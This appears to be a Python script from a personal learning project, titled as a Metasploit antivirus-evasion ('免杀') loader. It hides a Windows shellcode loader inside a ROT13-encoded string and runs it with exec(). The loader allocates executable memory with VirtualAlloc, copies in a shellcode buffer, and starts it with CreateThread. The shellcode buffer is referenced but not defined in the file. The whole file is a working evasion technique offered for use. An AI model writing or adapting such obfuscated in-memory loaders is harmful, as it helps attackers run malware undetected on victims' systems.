# -*- coding: utf-8 -*-
# @Time    : 16 2月 2025 7:56 下午
# @Author  : codervibe
# @File    : 逍遥子大表哥msf免杀.py
# @Project : pythonBasics
import ctypes
import base64


def rot13(message):
    res = ''
    for item in message:
        if (ord(item) >= ord('A') and ord(item) <= ord('M')) or (ord(item) >= ord('a') and ord(item) <= ord('m')):
            res += chr(ord(item) + 13)
        elif (ord(item) >= ord('N') and ord(item) <= ord('Z')) or (ord(item) >= ord('n') and ord(item) <= ord('z')):
            res += chr(ord(item) - 13)
        else:
            res += item
    return res




loader = "pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(furyypbqr), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(furyypbqr), yra(furyypbqr));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)"
exec(rot13(loader))